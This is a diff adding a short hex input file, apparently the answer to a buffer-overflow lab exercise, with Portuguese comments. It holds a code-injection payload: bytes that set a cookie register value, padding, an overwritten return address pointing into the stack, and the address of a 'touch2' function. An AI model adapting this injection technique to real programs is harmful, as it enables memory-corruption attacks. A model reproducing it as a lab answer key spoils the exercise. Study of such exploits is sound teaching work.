@@ -1,0 +1,5 @@
+48 c7 c7 aa 73 fa 50 c3 /* seta o cookie */
+00 00 00 00 00 00 00 00 /* blabla */
+00 00 00 00 00 00 00 00 
+70 74 61 55 00 00 00 00 /* endereço de %rsp  */
+08 1b 40 00 00 00 00 00 /* endereço de touch2  */
